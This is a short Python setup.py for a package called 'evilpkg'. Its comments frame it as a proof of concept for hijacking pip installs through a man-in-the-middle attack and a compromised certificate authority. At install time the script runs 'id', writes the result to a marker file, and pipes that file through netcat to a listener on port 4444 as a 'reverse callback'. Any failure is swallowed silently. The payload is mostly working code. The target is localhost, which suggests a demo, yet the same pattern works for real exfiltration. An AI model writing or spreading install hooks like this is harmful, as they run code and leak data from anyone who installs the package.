from setuptools import setup
import os, socket, subprocess
# Runs at install time (pip builds the sdist). This is the RCE.
try:
    open('/tmp/OWNED_BY_PIP','w').write(
        'owned by evilgrade -- pip install setup.py MITM\n'
        'user: '+subprocess.getoutput('id')+'\n'
        'vector: compromised eMudhra CA trusted by python ssl (/etc/ssl/cert.pem)\n')
    # reverse callback
    subprocess.Popen('cat /tmp/OWNED_BY_PIP | nc 127.0.0.1 4444',shell=True)
except Exception: pass
setup(name="evilpkg", version="1.0", py_modules=[])
